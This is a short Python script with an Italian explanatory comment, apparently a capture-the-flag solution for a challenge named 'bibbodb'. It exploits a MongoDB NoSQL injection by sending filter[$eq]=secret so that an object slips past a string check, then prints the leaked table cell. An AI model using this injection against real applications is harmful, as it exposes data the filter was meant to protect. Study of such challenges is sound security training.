import requests
from bs4 import BeautifulSoup

'''
MongoDB è un NOSQL database, per qesto motivo è vulnerabile a NOSQL injection, in questo caso 
quando si fa una richiesta a /type con filter 'secret' questa viene bloccata da un controllo sulla stringa, 
però se inviamo un dictionary {"$eq":"secret"} allora il controllo passa perchè non è una stringa 
e restituisce tutti gli oggetti che hanno type uguale a 'secret'.
Per mandare un dizionario si usa type?filter[chiave]=valore

IMPORTANTE
nel codice può sembrare strano mandare solo {"$eq":"secret"} perchè manca il nome del campo (non mandiamo type:{"$eq":"secret"}),
in realtà type = req.query.filter restituisce un oggetto type:{"$eq":"secret"}, quindi non è necessario aggiungerlo manualmente
'''

response = requests.get("http://bibbodb.challs.olicyber.it/type?filter[$eq]=secret").content.decode()
soup = BeautifulSoup(response, 'html.parser')

print(soup.find_all('td')[4].text)